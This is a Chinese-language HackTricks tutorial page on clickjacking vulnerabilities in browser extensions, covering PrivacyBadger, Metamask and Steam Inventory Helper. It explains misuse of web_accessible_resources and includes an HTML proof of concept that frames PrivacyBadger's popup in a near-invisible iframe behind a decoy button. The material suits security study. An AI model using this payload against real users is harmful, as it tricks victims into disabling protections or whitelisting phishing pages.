# BrowExt - 点击劫持

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## 基本信息

本页面将利用浏览器扩展中的点击劫持漏洞。\
如果您不知道点击劫持是什么，请查看：

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

扩展包含文件 **`manifest.json`**，该JSON文件有一个字段 `web_accessible_resources`。以下是[Chrome文档](https://developer.chrome.com/extensions/manifest/web_accessible_resources)对它的描述：

> 这些资源随后可以通过URL **`chrome-extension://[PACKAGE ID]/[PATH]`** 在网页中使用，该URL可以通过 **`extension.getURL方法`** 生成。列入白名单的资源会带有适当的CORS头部，因此它们可以通过XHR等机制访问。[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

除了可以通过网络访问，**`web_accessible_resources`** 中的资源还以扩展的环境权限运行：它们可以改变状态、加载其他资源，并以某些方式修改浏览器。如果 `web_accessible_resources` 中的文档可以执行任何有趣的行为，攻击者可以将其嵌入网页中，并诱使访问者触发它。

## PrivacyBadger示例

发现扩展PrivacyBadger中的 `skin/` 目录内容是 `web_accessible_resources`：
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
通过加载`skin/popup.html`，即当您点击浏览器中的PrivacyBadger图标时呈现的文档，**在iframe中我们可以欺骗用户点击"为此网站禁用PrivacyBadger"**，使用户面临更多跟踪的风险，并破坏PrivacyBadger的功能。**查看ClickJacking视频示例** [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)

修复很简单：**从`web_accessible_resources`中移除`/skin/*`**。

### PoC
```html
<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask 示例

可以在[**这里找到关于 Metamask 中 ClickJacking 的博客文章**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)。在这个案例中，Metamask 通过检查访问它的协议是 **`https:`** 或 **`http:`**（而不是例如 **`chrome:`**）来修复了漏洞：

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**另一个在 Metamask 扩展中被修复的 ClickJacking** 是用户能够在页面因为 `“web_accessible_resources”: [“inpage.js”, “phishing.html”]` 而被怀疑是钓鱼时，**点击以加入白名单**。由于该页面容易受到 Clickjacking 的攻击，攻击者可以通过展示正常内容使受害者在不知情的情况下点击加入白名单，然后返回将被加入白名单的钓鱼页面。

## Steam Inventory Helper 示例

查看以下页面，了解如何将浏览器扩展中的 **XSS** 与 **ClickJacking** 漏洞链接起来：

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## 参考资料

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
